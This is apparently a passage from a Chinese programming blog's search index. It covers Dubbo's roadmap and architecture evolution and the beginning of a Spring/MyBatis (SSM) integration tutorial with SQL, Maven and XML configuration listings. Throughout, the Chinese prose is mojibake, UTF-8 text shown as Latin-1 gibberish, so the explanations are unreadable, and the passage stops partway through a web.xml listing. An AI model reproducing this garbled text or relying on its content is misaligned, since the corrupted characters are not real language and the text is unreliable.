IPCï¼Œè¿™ä¸»è¦æ˜¯ä¸ºäº†å…¼å®¹è€ç³»ç»Ÿï¼Œè€Œå†…éƒ¨åˆ™ä¼šä¼˜å…ˆå°è¯•å†…åµŒæ¨¡å¼ã€‚ä»£ç†æ¨¡å¼ Ops å¯ç‹¬ç«‹å‡çº§æ¡†æ¶ï¼Œå‡å°‘ä¸šåŠ¡ä¾µå…¥ï¼Œè€Œå†…åµŒæ¨¡å¼å¯ä»¥å¸¦ä¸šåŠ¡æµ‹è¯•ã€éƒ¨ç½²èŠ‚ç‚¹å°‘ã€ç¨³å®šæ€§æ£€æµ‹æ–¹ä¾¿ã€‚åŒæ—¶ï¼Œå¯ä»¥å°† Dubbo3.0 å¯åŠ¨ä¸ºç‹¬ç«‹è¿›ç¨‹ï¼Œç”± dubbo-mesh è¿›è¡Œ IPCï¼Œè·¯ç”±ã€è´Ÿè½½å‡è¡¡å’Œç†”æ–­æœºåˆ¶å°†ç”±ç‹¬ç«‹è¿›ç¨‹æ§åˆ¶ã€‚ 2018 å¹´ 2 æœˆ 15 æ—¥ï¼Œé˜¿é‡Œå°† Dubbo å¼€æºè´¡çŒ®ç»™ Apacheï¼Œå³ incubator-dubbo æ€»ç»“ï¼Œä» Dubbo æ–°ç‰ˆæœ¬çš„è·¯çº¿è§„åˆ’ä¸Šå¯ä»¥çœ‹å‡ºï¼Œæ–°ç‰ˆæœ¬çš„ Dubbo åœ¨åŸæœ‰æœåŠ¡æ²»ç†çš„åŠŸèƒ½åŸºç¡€ä¸Šï¼Œå°†å…¨é¢æ‹¥æŠ±å¾®æœåŠ¡å’Œ Service Meshã€‚åŒæ—¶è€ƒè™‘åˆ°åœ¨é˜¿é‡Œäº‘å·²ç»æœ‰äº† Dubbo çš„å•†ä¸šç‰ˆæœ¬ï¼Œåœ¨æœªæ¥ä¸€æ®µæ—¶é—´å†…ï¼ŒDubbo çš„æ›´æ–°ä¸ç»´æŠ¤åº”è¯¥ä¸ä¼šå†é•¿æ—¶é—´ä¸­æ–­ã€‚ Dubbo å®˜æ–¹ä»‹ç» ç¬¬äºŒå±Š Dubbo å¼€å‘è€…æ²™é¾™ PDF èµ„æ–™ æœ±å‹‡: Dubbo å¼€æºç°çŠ¶ä¸æœªæ¥è§„åˆ’ æ½˜å¿—ä¼Ÿ: Dubbo åœ¨äº’é‡‘è¡Œä¸šçš„åº”ç”¨åœºæ™¯ å°é©¬å“¥: Dubbo Cloud Native ä¹‹è·¯çš„å®è·µä¸æ€è€ƒ éƒ­å¹³: Nacos - è´¡çŒ® Dubbo ç”Ÿæ€ï¼Œé˜¿é‡Œå·´å·´æ³¨å†Œä¸­å¿ƒå’Œé…ç½®ä¸­å¿ƒå¼€æºè®¡åˆ’ Dubbo 2.7 æœ€å…¸å‹çš„ä¸‰ä¸ªæ–°ç‰¹æ€§ å¼‚æ­¥åŒ–æ”¹é€  ä¸‰å¤§ä¸­å¿ƒæ”¹é€  æœåŠ¡æ²»ç†å¢å¼º Dubbo 2.7 æ”¹åŠ¨ä¸å‡çº§è¯´æ˜ Dubbo 2.7 å®˜æ–¹æ”¹åŠ¨è¯´æ˜ Dubbo 2.7 å‡çº§ä¸å¯èƒ½çš„å…¼å®¹æ€§é—®é¢˜æ€»ç»“ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼"},{title:"Dubbo ä¹‹ä¸€æ¶æ„æ¼”è¿›",url:"/posts/223fed88.html",text:'å•ä¸€åº”ç”¨æ¶æ„ ä¼˜ç‚¹ ç®€å•å®ç”¨ã€ä¾¿äºç»´æŠ¤ï¼Œå¼€å‘æˆæœ¬è¾ƒä½ ç¼ºç‚¹ éƒ¨ç½²éº»çƒ¦ï¼Œæ·»åŠ ã€ä¿®æ”¹ä¸ªåˆ«æ¨¡å—åŠŸèƒ½ï¼Œéœ€è¦é‡æ–°å°†æ‰€æœ‰æ¨¡å—çš„ä»£ç éƒ¨ç½²åˆ°å„ä¸ªæœåŠ¡å™¨ å•å°æœåŠ¡å™¨çš„æ€§èƒ½æœ‰é™ï¼Œä¸é€‚åˆå¯¹å¤–æä¾›æ‰€æœ‰æ¨¡å—åŠŸèƒ½ å­˜åœ¨å•ç‚¹æ•…éšœé—®é¢˜ å…³é”®ç‚¹ æ•°æ®è®¿é—®æ¡†æ¶ï¼ˆORMï¼‰ å‚ç›´åº”ç”¨æ¶æ„ ä¼˜ç‚¹ æ€§èƒ½æ‰©å±•æ¯”è¾ƒå®¹æ˜“ ååŒå¼€å‘æ¯”è¾ƒå®¹æ˜“ï¼Œæ¯ä¸ªç‹¬ç«‹çš„æ¨¡å—ç”±å¯¹åº”çš„å¼€å‘äººå‘˜è´Ÿè´£ ç¼ºç‚¹ æ¯ä¸ªæ¨¡å—éƒ½åŒ…å«äº† MVC ä¸‰å±‚çš„æ‰€æœ‰ä»£ç  ä¸é€‚ç”¨é¡µé¢ç»å¸¸ä¿®æ”¹çš„åœºæ™¯ï¼Œå¦‚æœå•ä¸ªæ¨¡å—å¯¹åº”çš„é¡µé¢ä¿®æ”¹äº†ï¼Œéœ€è¦é‡æ–°éƒ¨ç½²è¯¥æ¨¡å—çš„æ‰€æœ‰ä»£ç åˆ°æœåŠ¡å™¨ å„ä¸ªæ¨¡å—ä¹‹é—´ä¸å¯èƒ½å®Œå…¨ç‹¬ç«‹ï¼Œå¤§é‡åº”ç”¨ä¹‹é—´éœ€è¦ç›¸äº’äº¤äº’ï¼Œè°ƒç”¨å…³ç³»ç›¸å¯¹å¤æ‚ å…³é”®ç‚¹ ç”¨äºåŠ é€Ÿå‰ç«¯é¡µé¢å¼€å‘çš„ Web æ¡†æ¶ï¼ˆMVCï¼‰ åˆ†å¸ƒå¼æœåŠ¡æ¶æ„ ä¼˜ç‚¹ å‚ç›´å’Œæ¨ªå‘æ‰©å±•éƒ½æ¯”è¾ƒå®¹æ˜“ å‰ç«¯é¡µé¢å¯ä»¥å¿«é€Ÿè¿­ä»£å¼€å‘ æé«˜äº†ç³»ç»Ÿæ•´ä½“çš„é«˜å¯ç”¨ã€é«˜æ€§èƒ½ã€é«˜å¹¶å‘æ–¹é¢çš„èƒ½åŠ› ç¼ºç‚¹ ç³»ç»Ÿçš„å¤æ‚æ€§æé«˜äº†å¾ˆå¤šï¼ŒåŒ…æ‹¬å¼€å‘ä¸è¿ç»´æ–¹é¢ï¼Œ å…³é”®ç‚¹ åˆ†å¸ƒå¼æœåŠ¡æ¡†æ¶ (RPC) å¦‚ä½•æ‹†åˆ†ä¸šåŠ¡ä¸æé«˜ä¸šåŠ¡çš„å¤ç”¨ç¨‹åº¦ æµåŠ¨è®¡ç®—æ¶æ„ï¼ˆSOAï¼‰ åˆ†å¸ƒå¼æ¶æ„ä¸­çš„æœåŠ¡è¶Šæ¥è¶Šå¤šï¼Œå¯¼è‡´äº¤äº’è¶Šå‘å¤æ‚ï¼Œä¸å¯é¿å…ä¼šå‡ºç°èµ„æºæµªè´¹çš„æƒ…å†µã€‚å¦‚ä½•æ‰èƒ½æ›´å¥½åœ°ç®¡ç†å¤æ‚çš„è°ƒç”¨å…³ç³»ã€æé«˜èµ„æºåˆ©ç”¨ç‡ã€å¯¹æ•´ä¸ªæœåŠ¡é›†ç¾¤è¿›è¡ŒåŠ¨æ€æ§åˆ¶å‘¢ï¼ŸæœåŠ¡æ²»ç†è¢«å¼•å…¥æ¥è§£å†³æ­¤é—®é¢˜ã€‚æœåŠ¡æ²»ç†ä¸€èˆ¬åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š1ï¼‰é€šè¿‡æ³¨å†Œä¸­å¿ƒç®¡ç†æ‰€æœ‰æœåŠ¡ï¼ˆå³æœåŠ¡æ³¨å†Œä¸å‘ç°ï¼‰2ï¼‰è·¯ç”±é€‰æ‹©ã€è´Ÿè½½å‡è¡¡åŠå®¹é”™å¤„ç†3ï¼‰æœåŠ¡å‡ã€é™çº§ï¼Œç†”æ–­ï¼Œæƒé‡è°ƒæ•´4ï¼‰æœåŠ¡è¿‡æ»¤ï¼ˆé»‘åå•ã€ç™½åå•ï¼‰5ï¼‰æœåŠ¡çŠ¶æ€æ£€æµ‹ã€ç›‘æµ‹6ï¼‰æœåŠ¡æƒé™æ§åˆ¶7ï¼‰æœåŠ¡ä¾èµ–å…³ç³»8ï¼‰ç›‘æ§ä¸ç»Ÿè®¡9ï¼‰èµ„æºéš”ç¦» Dubbo å®˜æ–¹çš„æ¶æ„æ¼”è¿›å›¾ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"æ¶æ„ åˆ†å¸ƒå¼"},{title:"Spring æ•´åˆ MyBatis æ•™ç¨‹ï¼ˆSSM æ•´åˆï¼‰",url:"/posts/59033a11.html",text:'å‰è¨€æœ¬æ–‡ä¸»è¦ä»‹ç» Spring + Spring MVC + MyBatis æ•´åˆï¼ˆSSMï¼‰ï¼Œå¼€å‘å·¥å…·åŸºäº Eclipse + Mavenã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸‹æ–‡åªç»™å‡º SSM æ•´åˆæ‰€éœ€çš„æœ€å°é…ç½®å†…å®¹ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒéœ€è¦é€‚å½“ä¼˜åŒ–é¡¹ç›®çš„é…ç½®ï¼Œå°¤å…¶æ˜¯ Log4j2ã€Druid çš„é…ç½®ã€‚å®Œæ•´çš„é¡¹ç›®ä»£ç å¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ ssm-studyã€‚ ç‰ˆæœ¬è¯´æ˜ åç§° ç‰ˆæœ¬ Spring 4.3.2.RELEASE MyBatis 3.4.1 Druid 1.0.25 Log4j2 2.6.2 MySQL 5.7.26 å®˜æ–¹æ•´åˆæ¡ˆä¾‹ MyBatis JPetStore å‡†å¤‡å·¥ä½œæ•°æ®åº“åˆå§‹åŒ–æœ¬æ–‡çš„æ¡ˆä¾‹ä»£ç ä¾èµ–ä»¥ä¸‹æ•°æ®åº“è¡¨ç»“æ„ï¼Œå› æ­¤éœ€è¦æå‰åˆå§‹åŒ–å¥½æ•°æ®åº“æ‰èƒ½è¿è¡Œé¡¹ç›®ã€‚ 1234567891011121314151617--- åˆ›å»ºæ•°æ®åº“CREATE DATABASE `mybatis_lesson` DEFAULT CHARACTER SET utf8mb4;--- åˆ›å»ºæ•°æ®åº“è¡¨CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `dept_id` int(11) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;--- æ’å…¥è¡¨æ•°æ®insert into t_employee(id, last_name, gender, email) values(1, \'Jim\',\'1\', \'jim@gmail.com\');insert into t_employee(id, last_name, gender, email) values(2, \'Tom\',\'1\', \'tom@gmail.com\');insert into t_employee(id, last_name, gender, email) values(3, \'Peter\',\'1\', \'peter@gmail.com\'); åˆ›å»º Maven Web é¡¹ç›®åœ¨ Eclipse å†…ï¼Œæå‰åˆ›å»ºå¥½åŸºäº Maven çš„ Web é¡¹ç›®ã€‚ç”±äºç¯‡å¹…æœ‰é™ï¼Œè¿™é‡Œä¸å†ç´¯è¿°åˆ›å»ºæ­¥éª¤ï¼Œè¯¦ç»†æ•™ç¨‹å¯çœ‹è¿™é‡Œã€‚ å¿«é€Ÿå¼€å§‹å¼•å…¥ Maven ä¾èµ–123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt; &lt;log4j.version&gt;2.6.2&lt;/log4j.version&gt; &lt;mysql.version&gt;5.1.37&lt;/mysql.version&gt; &lt;druid.version&gt;1.0.25&lt;/druid.version&gt; &lt;mybatis.version&gt;3.4.1&lt;/mybatis.version&gt; &lt;mybatis-spring.version&gt;1.3.0&lt;/mybatis-spring.version&gt; &lt;servlet.version&gt;3.1.0&lt;/servlet.version&gt; &lt;spring.version&gt;4.3.2.RELEASE&lt;/spring.version&gt; &lt;gson.version&gt;2.7&lt;/gson.version&gt; &lt;commons-collections.version&gt;3.2.2&lt;/commons-collections.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;!-- Junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Servlet --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- JSTL --&gt; &lt;dependency&gt; &lt;groupId&gt;taglibs&lt;/groupId&gt; &lt;artifactId&gt;standard&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;jstl&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Log4j2 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MySQL --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Druid --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;${druid.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;${mybatis.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;${mybatis-spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring IOC --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-beans&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-expression&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring AOP --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-aop&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-aspects&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring Web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring DAO --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-orm&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-tx&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring Test --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Common Tools --&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;${gson.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;${commons-collections.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»ºé¡¹ç›®é…ç½®æ–‡ä»¶Log4j2 é…ç½®æ–‡ä»¶åœ¨ /src/main/resources ç›®å½•ä¸‹åˆ›å»º log4j2.xml é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 12345678910111213&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Configuration status="WARN"&gt; &lt;Appenders&gt; &lt;Console name="Console" target="SYSTEM_OUT"&gt; &lt;PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n" /&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level="error"&gt; &lt;AppenderRef ref="Console" /&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; æ•°æ®åº“é…ç½®æ–‡ä»¶åœ¨ /src/main/resources ç›®å½•ä¸‹åˆ›å»º db.properties é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 1234567891011jdbc.user=rootjdbc.password=123456jdbc.url=jdbc:mysql://127.0.0.1:3306/mybatis_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTCjdbc.miniPoolSize=10jdbc.maxPoolSize=30jdbc.initialPoolSize=1jdbc.maxWait=60000jdbc.timeBetweenEvictionRunsMillis=60000jdbc.minEvictableIdleTimeMillis=300000jdbc.preferredTestQuery=select 1 MyBatis é…ç½®æ–‡ä»¶åœ¨ /src/main/resources ç›®å½•ä¸‹åˆ›å»º mybatis-config.xml é…ç½®æ–‡ä»¶ï¼Œç”¨äºå­˜æ”¾ MyBatis çš„å…¨å±€æ ¸å¿ƒé…ç½®ä¿¡æ¯ï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt; &lt;settings&gt; &lt;!-- å¼€å¯äºŒçº§ç¼“å­˜ --&gt; &lt;setting name="cacheEnabled" value="true" /&gt; &lt;!-- å¼€å¯é©¼å³°å‘½åè‡ªåŠ¨æ˜ å°„ --&gt; &lt;setting name="mapUnderscoreToCamelCase" value="true" /&gt; &lt;/settings&gt;&lt;/configuration&gt; Spring é…ç½®æ–‡ä»¶Spring MVC é…ç½®æ–‡ä»¶åœ¨ /src/main/resources ç›®å½•ä¸‹åˆ›å»º application-servlet.xml é…ç½®æ–‡ä»¶ï¼Œç”¨äºé…ç½® Spring MVC çš„è¿è¡Œï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemaLocation="http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-4.0.xsd http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd"&gt; &lt;!-- Spring æ‰«ææ§åˆ¶å™¨ç»„ä»¶ --&gt; &lt;context:component-scan base-package="com.clay.mybatis" use-default-filters="false"&gt; &lt;context:include-filter type="annotation" expression="org.springframework.stereotype.Controller" /&gt; &lt;/context:component-scan&gt; &lt;!-- Spring MVC è§†å›¾è§£æå™¨ --&gt; &lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix" value="/WEB-INF/pages/"&gt;&lt;/property&gt; &lt;property name="suffix" value=".jsp"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- Spring MVC æ³¨è§£é©±åŠ¨ --&gt; &lt;mvc:annotation-driven&gt;&lt;/mvc:annotation-driven&gt; &lt;mvc:default-servlet-handler /&gt;&lt;/beans&gt; Spring Context é…ç½®æ–‡ä»¶åœ¨ /src/main/resources ç›®å½•ä¸‹åˆ›å»º application-context.xml é…ç½®æ–‡ä»¶ï¼ŒSpring æ•´åˆ MyBatis çš„æ ¸å¿ƒé…ç½®ä¿¡æ¯å°±å†™åœ¨é‡Œé¢ï¼ˆä¹Ÿå°±æ˜¯å®šä¹‰ SqlSessionFactoryBean çš„ Beanï¼‰ï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mybatis-spring="http://mybatis.org/schema/mybatis-spring" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://mybatis.org/schema/mybatis-spring http://mybatis.org/schema/mybatis-spring-1.2.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd"&gt; &lt;!-- å¼•å…¥æ•°æ®åº“é…ç½®æ–‡ä»¶ --&gt; &lt;context:property-placeholder location="classpath:db.properties" /&gt; &lt;!-- æ‰«æç»„ä»¶ --&gt; &lt;context:component-scan base-package="com.clay.mybatis"&gt; &lt;context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller" /&gt; &lt;/context:component-scan&gt; &lt;!-- æ•°æ®æº --&gt; &lt;bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource" init-method="init" destroy-method="close"&gt; &lt;property name="url" value="${jdbc.url}" /&gt; &lt;property name="username" value="${jdbc.user}" /&gt; &lt;property name="password" value="${jdbc.password}" /&gt; &lt;property name="maxActive" value="${jdbc.maxPoolSize}" /&gt; &lt;property name="initialSize" value="${jdbc.initialPoolSize}" /&gt; &lt;property name="maxWait" value="${jdbc.maxWait}" /&gt; &lt;property name="minIdle" value="${jdbc.miniPoolSize}" /&gt; &lt;property name="timeBetweenEvictionRunsMillis" value="${jdbc.timeBetweenEvictionRunsMillis}" /&gt; &lt;property name="minEvictableIdleTimeMillis" value="${jdbc.minEvictableIdleTimeMillis}" /&gt; &lt;property name="validationQuery" value="${jdbc.preferredTestQuery}" /&gt; &lt;property name="testWhileIdle" value="true" /&gt; &lt;property name="filters" value="stat" /&gt; &lt;/bean&gt; &lt;!-- äº‹åŠ¡ç®¡ç† --&gt; &lt;bean id="dataSourceTransactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;/bean&gt; &lt;!-- å¼€å¯åŸºäºæ³¨è§£çš„äº‹åŠ¡ --&gt; &lt;tx:annotation-driven transaction-manager="dataSourceTransactionManager" /&gt; &lt;!-- å®šä¹‰ SqlSessionFactory --&gt; &lt;bean id="sqlSessionFactoryBean" class="org.mybatis.spring.SqlSessionFactoryBean"&gt; &lt;!-- æ•°æ®æº --&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;!-- ç±»å‹åˆ«å --&gt; &lt;property name="typeAliasesPackage" value="com.clay.mybatis.bean" /&gt; &lt;!--æŒ‡å®š SQL æ˜ å°„æ–‡ä»¶çš„ä½ç½® --&gt; &lt;property name="mapperLocations" value="classpath*:mapper/**/*.xml" /&gt; &lt;!-- æŒ‡å®š MyBatis å…¨å±€é…ç½®æ–‡ä»¶çš„ä½ç½® --&gt; &lt;property name="configLocation" value="classpath:mybatis-config.xml" /&gt; &lt;/bean&gt; &lt;!-- å®šä¹‰ SqlSessionTemplate --&gt; &lt;bean id="sqlSession" class="org.mybatis.spring.SqlSessionTemplate"&gt; &lt;constructor-arg name="sqlSessionFactory" ref="sqlSessionFactoryBean" /&gt; &lt;/bean&gt; &lt;!-- æ‰«æ MyBatis çš„ Mapper æ¥å£ --&gt; &lt;mybatis-spring:scan base-package="com.clay.mybatis.dao" /&gt; &lt;!-- æˆ–è€…ä½¿ç”¨ä»¥ä¸‹çš„é…ç½®æ¥æ‰«æ Mapper æ¥å£ --&gt; &lt;!-- &lt;bean id="configure" class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;property name="basePackage" value="com.clay.mybatis.dao"&gt;&lt;/property&gt; &lt;/bean&gt; --&gt;&lt;/beans&gt; æ›´æ”¹ web.xml é…ç½®æ–‡ä»¶æ›´æ”¹ /src/main/webapp/WEB-INF ç›®å½•ä¸‹çš„ web.xml çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://JAVA.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"&gt; &lt;!-- Spring é…ç½® --&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:application-context.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;!-- Spring MVC é…ç½® --&gt; &lt;servlet&gt; &lt;servlet-name&gt;spring&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;init-param&gt; 